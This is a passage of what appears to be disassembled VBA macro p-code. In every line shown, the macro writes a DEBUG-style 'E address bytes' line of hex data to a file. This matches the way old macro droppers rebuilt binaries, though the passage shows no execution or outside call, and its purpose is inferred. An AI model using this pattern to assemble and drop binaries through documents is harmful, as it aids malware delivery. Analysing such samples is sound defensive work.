' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B800 D0 A7 BC D8 BF D4 F0 B1 C6 E1 A2 B7 D2 9D B3 CC"
' 	PrintItemNL 
' Line #3139:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B810 9B B1 CA DB F2 FF CA E2 F6 85 9D B1 C8 E0 F2 9A"
' 	PrintItemNL 
' Line #3140:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B820 B2 C4 96 AB C0 A7 BC D1 B1 C6 DB E3 F8 FF C1 D6"
' 	PrintItemNL 
' Line #3141:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B830 EB C4 D9 EE 6D 82 97 77 8C A1 7F 94 A9 46 5B 70"
' 	PrintItemNL 
' Line #3142:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B840 3A 4F 64 7E 93 A8 82 97 AC 61 76 8B 6E 83 98 A2"
' 	PrintItemNL 
' Line #3143:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B850 B8 CA 84 98 AA 63 77 88 91 A6 B5 9C B2 BE A2 B8"
' 	PrintItemNL 
' Line #3144:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B860 C3 9E B4 BF AA C0 CC 88 9E AA 6A 7E 8F B4 C8 D9"
' 	PrintItemNL 
' Line #3145:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B870 9B AF C1 83 97 A9 7C 90 A1 8F A4 B3 99 AF BB 9E"
' 	PrintItemNL 
' Line #3146:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B880 B1 BE A0 B1 BE 4F 60 6D 45 56 5F 56 66 6C 51 60"
' 	PrintItemNL 
' Line #3147:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B890 63 48 57 59 A1 AF AE E0 EE ED 97 A2 A6 6C 77 7B"
' 	PrintItemNL 
' Line #3148:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B8A0 8A 96 9C 83 8F 95 7E 8A 8E 6E 7D 80 96 A5 A7 B5"
' 	PrintItemNL 
' Line #3149:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B8B0 C4 C6 D4 E1 E3 BF CC CE 87 93 95 37 44 46 43 4F"
' 	PrintItemNL 
' Line #3150:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B8C0 51 00 04 06 00 00 FA FB F9 F0 F1 EF E1 E2 E0 CE"
' 	PrintItemNL 
' Line #3151:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B8D0 CF CD C2 C4 C4 BF C3 C4 00 00 04 75 7E 87 6C 78"
' 	PrintItemNL 
' Line #3152:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B8E0 84 6E 7E 8B 75 83 95 5C 6C 7D 74 83 93 7A 8A 97"
' 	PrintItemNL 
' Line #3153:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B8F0 88 93 A1 8D 99 A5 88 92 A3 64 6E 7F 78 85 95 9D"
' 	PrintItemNL 
' Line #3154:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B900 AA BA 93 A0 B0 5C 69 79 70 7F 8F 89 98 A8 6C 7B"
' 	PrintItemNL 
' Line #3155:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B910 8B 7E 8D 9D B0 C0 D0 C9 D9 E9 B7 C7 D7 AA BA CA"
' 	PrintItemNL 
' Line #3156:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B920 BD CD DD E3 F4 FF C2 D4 DF B4 C6 D1 BC CD DA B6"
' 	PrintItemNL 
' Line #3157:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B930 C7 D4 AB BE CB C2 D5 E2 A4 B7 C6 45 57 68 8A 9C"
' 	PrintItemNL 
' Line #3158:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B940 AD B6 CA DC BA CE E0 AD C0 D5 A7 B9 D0 AC BE D5"
' 	PrintItemNL 
' Line #3159:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B950 73 85 9C CB E0 F6 CE E3 F9 A3 B8 CE 8A 9F B5 B0"
' 	PrintItemNL 
' Line #3160:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B960 C4 DD AE C2 DB 9A AD C8 B6 C9 E4 AE C1 DC A8 BB"
' 	PrintItemNL 
' Line #3161:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B970 D6 88 9C B5 C4 D8 F1 CA DF F5 B4 C9 DE 94 A9 BE"
' 	PrintItemNL 
' Line #3162:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B980 AD C3 D5 67 7D 8F A9 BD CF A7 BB CD B3 C7 D9 DB"
' 	PrintItemNL 
' Line #3163:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B990 EF FF C8 DC EE B1 C5 D7 62 76 88 75 89 9B 40 54"
' 	PrintItemNL 
' Line #3164:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B9A0 66 28 3C 4E 67 7B 8D 89 9D AF 63 77 89 78 8C 9E"
' 	PrintItemNL 
' Line #3165:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B9B0 9E B2 C4 8D A1 B3 61 72 85 89 9B AC 9C AF BE AC"
' 	PrintItemNL 
' Line #3166:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B9C0 BF CC A9 BD C8 A9 BD C8 A8 BB C8 72 85 92 96 A8"
' 	PrintItemNL 
' Line #3167:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B9D0 B9 A1 B3 C4 99 AA BD 81 92 A5 7F 91 A2 9E B1 C0"
' 	PrintItemNL 
' Line #3168:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B9E0 B1 C4 D1 A5 B9 C4 6D 7F 8A 2A 3A 46 4A 5A 61 65"
' 	PrintItemNL 
' Line #3169:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E B9F0 76 79 44 53 55 37 47 46 B9 C7 C6 ED FB FA B1 BC"
' 	PrintItemNL 
' Line #3170:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BA00 C0 77 82 86 80 8A 91 87 93 99 92 9E A2 95 A1 A5"
' 	PrintItemNL 
' Line #3171:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BA10 A7 B4 B6 99 A8 AA 97 A4 A6 BC CB CD B2 BF C1 4A"
' 	PrintItemNL 
' Line #3172:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BA20 59 5B 42 4F 51 00 07 09 00 00 F7 F8 F6 E9 EA E8"
' 	PrintItemNL 
' Line #3173:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BA30 DC DD DB D1 D2 D0 C3 C5 C5 B6 BA BB 00 00 04 73"
' 	PrintItemNL 
' Line #3174:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BA40 7C 85 66 72 7E 80 90 9D 94 A2 B4 7A 8A 9B 80 8F"
' 	PrintItemNL 
' Line #3175:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BA50 9F 82 92 9F 96 A1 AF 91 9D A9 85 90 9E 7D 87 98"
' 	PrintItemNL 
' Line #3176:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BA60 9F AC BC 9F AC BC 70 7D 8D 65 72 82 85 94 A4 7D"
' 	PrintItemNL 
' Line #3177:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BA70 8C 9C 76 85 95 8F 9E AE 9D AD BD B2 C2 D2 C4 D4"
' 	PrintItemNL 
' Line #3178:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BA80 E4 B2 C2 D2 AD BD CD CA DB E8 D8 E9 F6 C7 D8 E5"
' 	PrintItemNL 
' Line #3179:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BA90 BA CB D8 B9 CA D7 B7 CA D7 B6 C9 D6 B1 C4 D3 AB"
' 	PrintItemNL 
' Line #3180:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BAA0 BE CD 78 8B 9A 9F B1 C2 BB CF E0 B7 CB DD 9B AE"
' 	PrintItemNL 
' Line #3181:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BAB0 C3 9C AF C4 82 94 AB BF D2 E7 D7 EA FF B5 CA DF"
' 	PrintItemNL 
' Line #3182:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BAC0 97 AC C1 93 A8 BE AC C1 D7 A4 B8 D1 9C B0 C9 B6"
' 	PrintItemNL 
' Line #3183:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BAD0 CA E3 A8 BC D5 90 A4 BD B7 CC E2 C1 D6 EC A9 BE"
' 	PrintItemNL 
' Line #3184:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BAE0 D3 A6 BC CE 91 A7 B9 6F 85 97 AB BF D1 83 97 A9"
' 	PrintItemNL 
' Line #3185:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BAF0 CE E2 F4 DC F0 FF D2 E6 F8 85 99 AB 75 89 9B 54"
' 	PrintItemNL 
' Line #3186:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BB00 68 7A 2C 40 52 4E 62 74 74 88 9A 87 9B AD 71 85"
' 	PrintItemNL 
' Line #3187:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BB10 97 7D 91 A3 98 AC BE 70 84 96 82 94 A5 A5 B8 C7"
' 	PrintItemNL 
' Line #3188:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BB20 B5 C8 D7 A4 B7 C4 AF C3 CE A9 BD C8 80 93 A0 85"
' 	PrintItemNL 
' Line #3189:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BB30 98 A5 A8 BB CA AF C1 D2 8E 9F B2 81 93 A4 99 AC"
' 	PrintItemNL 
' Line #3190:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BB40 BB A8 BB C8 A7 BA C7 A0 B2 BD 45 55 61 35 46 4F"
' 	PrintItemNL 
' Line #3191:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BB50 4F 5F 66 5D 6E 71 56 65 67 41 51 50 AC BA B9 F3"
' 	PrintItemNL 
' Line #3192:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BB60 FF FF CA D6 D8 89 94 98 82 8C 93 7F 89 90 80 8C"
' 	PrintItemNL 
' Line #3193:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BB70 90 8A 96 9A B9 C6 C8 C3 D0 D2 9A A9 AB 90 9F A1"
' 	PrintItemNL 
' Line #3194:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BB80 8F 9E A0 4E 5D 5F 49 58 5A 00 01 03 00 00 F6 F7"
' 	PrintItemNL 
' Line #3195:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BB90 F5 E9 EA E8 DE DF DD D4 D5 D3 C1 C3 C3 B0 B4 B5"
' 	PrintItemNL 
' Line #3196:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BBA0 00 00 05 9C A5 AE 8D 99 A5 81 91 9E 91 9F B1 9F"
' 	PrintItemNL 
' Line #3197:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BBB0 AF C0 A7 B6 C6 8E 9E AB 97 A2 B0 92 9E AA 8F 9A"
' 	PrintItemNL 
' Line #3198:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BBC0 A8 9D A8 B6 B3 BE CC 94 9F AD 62 6F 7D 87 94 A2"
' 	PrintItemNL 
' Line #3199:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BBD0 97 A4 B2 70 7D 8B 94 A4 B1 A3 B3 C0 95 A5 B2 AA"
' 	PrintItemNL 
' Line #3200:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BBE0 BA C7 CB DC E9 C2 D3 E0 B3 C4 D1 A7 B8 C5 CC DF"
' 	PrintItemNL 
' Line #3201:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BBF0 EE D2 E5 F4 C5 D8 E7 B8 CB DA C1 D4 E1 C6 D9 E6"
' 	PrintItemNL 
' Line #3202:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BC00 BA CD DA B1 C4 D1 9E B1 BE 9B AE BD AD C0 CF B4"
' 	PrintItemNL 
' Line #3203:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BC10 C6 D7 A0 B1 C4 94 A5 B8 86 97 AC 91 A5 B7 DA EE"
' 	PrintItemNL 
' Line #3204:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BC20 FF CC E0 F2 AC C0 D2 8D A0 B5 9B AD C4 9D AF C6"
' 	PrintItemNL 
' Line #3205:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BC30 A4 B6 CD B2 C4 DB A6 B8 CF 9D AF C6 AB BD D4 A5"
' 	PrintItemNL 
' Line #3206:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BC40 B7 CE 9E B1 C6 CF E3 F5 82 96 A8 7F 93 A4 79 8D"
' 	PrintItemNL 
' Line #3207:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BC50 9E 8C A0 B1 C9 DD EE D3 E7 F8 AC C0 D1 6D 81 92"
' 	PrintItemNL 
' Line #3208:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BC60 4F 63 74 2D 41 52 4A 5E 6F 75 89 9A 84 98 A9 63"
' 	PrintItemNL 
' Line #3209:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BC70 77 88 73 87 98 8E A2 B3 74 88 99 6D 81 92 92 A4"
' 	PrintItemNL 
' Line #3210:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BC80 B5 A7 BA C9 A4 B7 C6 B5 C8 D5 B6 CA D5 89 9E A6"
' 	PrintItemNL 
' Line #3211:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BC90 86 9A A5 A9 BC C9 B5 C8 D7 A2 B5 C4 77 89 9A 82"
' 	PrintItemNL 
' Line #3212:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BCA0 94 A5 AC BF CE AD C0 CD 90 A3 B0 76 88 93 62 73"
' 	PrintItemNL 
' Line #3213:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BCB0 7C 5F 6F 76 55 63 69 43 52 54 45 55 54 33 44 41"
' 	PrintItemNL 
' Line #3214:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BCC0 8B 99 97 D6 E4 E3 B5 C1 C3 7B 86 8A 6F 79 80 70"
' 	PrintItemNL 
' Line #3215:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BCD0 7A 81 6E 78 7F 78 83 87 B1 BD BF BF CC CE AC BB"
' 	PrintItemNL 
' Line #3216:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BCE0 BD A7 B9 BA B3 C5 C6 60 72 73 4E 60 61 00 06 07"
' 	PrintItemNL 
' Line #3217:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BCF0 00 00 F9 FA F8 EC ED EB DF E0 DE D3 D4 D2 C0 C2"
' 	PrintItemNL 
' Line #3218:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BD00 C2 B3 B7 B8 06 0C 11 B6 BF C8 94 A0 AC 6C 7C 89"
' 	PrintItemNL 
' Line #3219:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BD10 7F 8D 9F A1 B1 C2 B5 C4 D4 A8 B8 C5 AC B7 C5 A3"
' 	PrintItemNL 
' Line #3220:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BD20 AF BB 9A A5 B3 B1 BC CA B0 BB C9 88 93 A1 67 74"
' 	PrintItemNL 
' Line #3221:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BD30 82 8F 9C AA 83 90 9E 6F 7C 8A A1 B1 BE 9B AB B8"
' 	PrintItemNL 
' Line #3222:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BD40 8E 9E AB AA BA C7 BD CE DB C8 D9 E6 D2 E3 F0 A6"
' 	PrintItemNL 
' Line #3223:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BD50 B6 C6 B1 C3 D4 CA DC ED D1 E3 F4 B6 C9 D8 AC BF"
' 	PrintItemNL 
' Line #3224:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BD60 CE C9 DC E9 D8 EB F8 C6 D9 E6 BB CE DB A4 B7 C4"
' 	PrintItemNL 
' Line #3225:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BD70 9B AE BB A8 BB CA B2 C4 D5 9B AD BE 86 98 A9 73"
' 	PrintItemNL 
' Line #3226:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BD80 85 96 C6 D7 EA E5 F9 FF BD D1 E3 9D B1 C3 90 A3"
' 	PrintItemNL 
' Line #3227:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BD90 B8 74 86 9D 98 AA C1 9A AC C3 A3 B5 CC A8 BA D1"
' 	PrintItemNL 
' Line #3228:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BDA0 AD BF D6 7E 91 A6 92 A6 B8 D5 E9 FB 68 7C 8D 78"
' 	PrintItemNL 
' Line #3229:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BDB0 8C 9D 6D 81 92 B1 C5 D6 C1 D5 E6 C4 D8 E9 77 8B"
' 	PrintItemNL 
' Line #3230:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BDC0 9C 66 7A 8B 44 58 69 4F 63 74 71 85 96 7E 92 A3"
' 	PrintItemNL 
' Line #3231:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BDD0 66 7A 8B 4A 5E 6F 7D 91 A2 8C A0 B1 67 7B 8C 8A"
' 	PrintItemNL 
' Line #3232:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BDE0 9E AF AA BC CD A7 BA C9 A4 B7 C4 B8 CC D7 93 A8"
' 	PrintItemNL 
' Line #3233:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BDF0 B0 72 87 8F A0 B4 BF AE C2 CD AA BD CC 8C 9F AE"
' 	PrintItemNL 
' Line #3234:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BE00 8D 9F B0 A9 BB CC BD D0 DF AD C0 CD 79 8D 98 54"
' 	PrintItemNL 
' Line #3235:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BE10 67 6F 5C 6B 74 62 72 79 62 70 76 51 60 62 4A 5A"
' 	PrintItemNL 
' Line #3236:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BE20 59 42 53 50 A3 B1 AF EA F8 F6 B9 C5 C7 8B 97 99"
' 	PrintItemNL 
' Line #3237:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BE30 7B 85 8C 7A 84 8B 7D 87 8E 91 9B A2 D0 DB DF E1"
' 	PrintItemNL 
' Line #3238:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BE40 ED EF BB CA CC AD BF C0 B2 C1 C3 68 7A 7B 4F 5E"
' 	PrintItemNL 
' Line #3239:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BE50 60 00 02 03 00 00 F8 F9 F7 ED EE EC DC DD DB D0"
' 	PrintItemNL 
' Line #3240:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BE60 D1 CF C4 C6 C6 B6 BA BB 00 00 05 9B A4 AD 8C 98"
' 	PrintItemNL 
' Line #3241:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BE70 A4 78 88 95 8E 9C AE 84 94 A5 89 98 A8 A9 B9 C6"
' 	PrintItemNL 
' Line #3242:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BE80 B8 C3 D1 A6 B2 BE A1 AC BA B2 BD CB B4 BF CD 96"
' 	PrintItemNL 
' Line #3243:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BE90 A1 AF 6C 77 85 73 7E 8C 68 75 83 84 91 9F A1 AE"
' 	PrintItemNL 
' Line #3244:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BEA0 BC 9A A7 B5 8B 9B A8 9D AD BA A0 B0 BD AA BA C7"
' 	PrintItemNL 
' Line #3245:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BEB0 CC DC E9 BA CA DA A9 BA CD B3 C4 D7 CB DC EF CA"
' 	PrintItemNL 
' Line #3246:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BEC0 DC ED A9 BC CB 9E B1 C0 BB CC D9 D4 E5 F2 D2 E4"
' 	PrintItemNL 
' Line #3247:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BED0 EF C1 D3 DE A2 B4 BF A3 B4 C1 C7 D8 E5 B9 C9 D9"
' 	PrintItemNL 
' Line #3248:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BEE0 8F 9F AF 53 66 75 5F 71 82 E2 F4 FF E6 F8 FF 9E"
' 	PrintItemNL 
' Line #3249:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BEF0 AF C2 75 86 99 67 78 8D 87 98 AD 7F 90 A5 97 A7"
' 	PrintItemNL 
' Line #3250:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BF00 BE 95 A5 BC A7 B8 CD 6E 7F 94 9D AE C1 BC CD E0"
' 	PrintItemNL 
' Line #3251:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BF10 50 62 73 6E 80 91 70 82 93 A3 B5 C6 D0 E2 F3 B6"
' 	PrintItemNL 
' Line #3252:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BF20 C8 D9 7A 8C 9D 59 6B 7C 63 75 86 70 82 93 69 7B"
' 	PrintItemNL 
' Line #3253:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BF30 8C 60 72 83 37 49 5A 70 82 93 9B AD BE 79 8B 9C"
' 	PrintItemNL 
' Line #3254:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BF40 8B 9D AE A2 B4 C5 B4 C4 D4 B0 C0 D0 BA CB D8 97"
' 	PrintItemNL 
' Line #3255:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BF50 A9 B4 7B 8E 96 9F B2 BA B9 CB D6 B6 C8 D3 A3 B3"
' 	PrintItemNL 
' Line #3256:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BF60 C3 90 A0 B0 AF BF D0 B8 C8 D9 B1 C1 D1 9A AB B8"
' 	PrintItemNL 
' Line #3257:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BF70 66 78 83 5D 70 78 59 68 71 5E 6C 72 67 76 79 6A"
' 	PrintItemNL 
' Line #3258:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BF80 7A 79 62 73 70 4E 5F 5B 8B 99 97 AD BB B9 8F 9C"
' 	PrintItemNL 
' Line #3259:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BF90 9E 91 9E A0 95 9F A6 7E 88 8F 63 6B 72 6E 76 7D"
' 	PrintItemNL 
' Line #3260:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BFA0 B8 C1 C5 E1 EC F0 E2 EF F1 C2 D1 D3 A5 B2 B4 65"
' 	PrintItemNL 
' Line #3261:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BFB0 74 76 4F 5C 5E 00 01 03 00 00 F4 F5 F3 EE EF ED"
' 	PrintItemNL 
' Line #3262:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BFC0 DF E0 DE D0 D1 CF C5 C7 C7 B5 B9 BA 00 00 04 90"
' 	PrintItemNL 
' Line #3263:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BFD0 99 A2 8C 98 A4 71 81 8E 8A 98 AA 82 92 A3 80 8F"
' 	PrintItemNL 
' Line #3264:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BFE0 9F 9D AD BA A4 AF BD 96 A2 AE B2 BD CB A7 B2 C0"
' 	PrintItemNL 
' Line #3265:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E BFF0 B5 C0 CE A5 B0 BE 76 81 8F 71 7C 8A 79 86 94 98"
' 	PrintItemNL 
' Line #3266:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C000 A5 B3 AD BA C8 B6 C3 D1 A1 B1 BE 9F AF BC A1 B1"
' 	PrintItemNL 
' Line #3267:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C010 BE 9E AE BB BE CE DB DB EB FB C0 CF E2 A6 B7 CC"
' 	PrintItemNL 
' Line #3268:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C020 A8 B9 CE C9 DA ED CE E0 F1 A6 B9 C8 92 A3 B0 9F"
' 	PrintItemNL 
' Line #3269:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C030 B1 BC C3 D5 E0 D4 E6 F1 C3 D5 E0 B0 C2 CD C1 D2"
' 	PrintItemNL 
' Line #3270:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C040 DF CA DB E8 AF BF CF 7B 8B 9B 34 47 56 87 9A A9"
' 	PrintItemNL 
' Line #3271:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C050 E2 F4 FF C9 DB EC 6D 7E 91 51 62 75 63 74 89 7A"
' 	PrintItemNL 
' Line #3272:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E C060 8B A0 7A 8A A1 60 70 87 7D 8E A3 73 84 99 BE CF"
' 	PrintItemNL 
' Line #3273:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
